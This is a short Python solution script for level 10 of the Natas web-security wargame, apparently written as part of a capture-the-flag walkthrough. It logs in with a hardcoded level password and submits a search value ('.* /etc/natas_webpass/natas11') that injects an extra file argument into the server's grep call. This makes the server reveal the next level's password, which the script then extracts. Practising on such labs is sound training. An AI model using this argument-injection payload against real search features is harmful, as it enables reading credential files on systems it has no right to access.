# -*- coding: utf-8 -*-
from base import get_page, post_page
import re


def natas10():
    username = "natas10"
    password = "nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu"
    data = {"needle": ".* /etc/natas_webpass/natas11", "submit": "Search"}
    content = post_page(10, username, password, data=data)
    password = re.search(r"(?<=natas11:)\w{32}", content)
    if password is None:
        print("Fail to find password")
        return
    print(password.group(0))


if __name__ == "__main__":
    natas10()
